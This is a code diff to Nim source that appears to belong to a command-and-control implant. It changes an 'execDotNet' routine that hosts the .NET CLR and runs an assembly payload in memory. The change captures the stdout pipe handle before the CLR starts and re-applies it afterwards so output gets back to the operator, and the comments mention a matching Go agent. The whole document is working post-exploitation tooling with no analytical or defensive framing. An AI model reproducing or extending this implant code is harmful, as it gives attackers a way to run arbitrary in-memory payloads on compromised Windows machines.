@@ -213,6 +213,11 @@ proc execDotNet*(asmBytes: openArray[byte], args: string,
   if asmBytes.len < 2: return "[!] dotnet_exec: empty payload"
   if not loadOleaut32(): return "[!] dotnet_exec: oleaut32.dll load failed"
 
+  # Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may reset
+  # standard handles internally (same behaviour documented in the Go agent).
+  let hPipe: HANDLE = if childMode: GetStdHandle(STD_OUTPUT_HANDLE)
+                      else: INVALID_HANDLE_VALUE
+
   let hMs = LoadLibraryA("mscoree.dll")
   if hMs == 0: return "[!] dotnet_exec: mscoree.dll not found"
   type PfnCLRCI = proc(rclsid, riid: ptr GUID, ppUnk: ptr pointer): HRESULT {.stdcall.}
@@ -242,6 +247,11 @@ proc execDotNet*(asmBytes: openArray[byte], args: string,
   let hrStart = cast[PfnVoid](vt(pCH)[10])(pCH)
   if FAILED(hrStart) and hrStart != HRESULT(1):  # S_FALSE=1 = already started
     return "[!] dotnet_exec: Start failed"
+
+  # Re-apply stdout/stderr to the pipe after Start() — the CLR may reset handles.
+  if childMode and hPipe != INVALID_HANDLE_VALUE and hPipe != 0:
+    SetStdHandle(STD_OUTPUT_HANDLE, hPipe)
+    SetStdHandle(STD_ERROR_HANDLE, hPipe)
 
   type PfnGDD = proc(self: pointer, ppUnk: ptr pointer): HRESULT {.stdcall.}
   var pDomThunk: pointer
@@ -275,8 +285,11 @@ proc execDotNet*(asmBytes: openArray[byte], args: string,
 
   var fhTmp: HANDLE
   if childMode:
-    # Child: stdout is already the pipe — use it directly for CLR output
-    fhTmp = GetStdHandle(STD_OUTPUT_HANDLE)
+    # Use pre-captured handle (not GetStdHandle — Start() may have reset it).
+    # Re-apply both Win32 handles before Invoke_3.
+    fhTmp = if hPipe != INVALID_HANDLE_VALUE and hPipe != 0: hPipe
+            else: GetStdHandle(STD_OUTPUT_HANDLE)
+    SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
     SetStdHandle(STD_ERROR_HANDLE, fhTmp)
   else:
     fhTmp = redirectStdout()
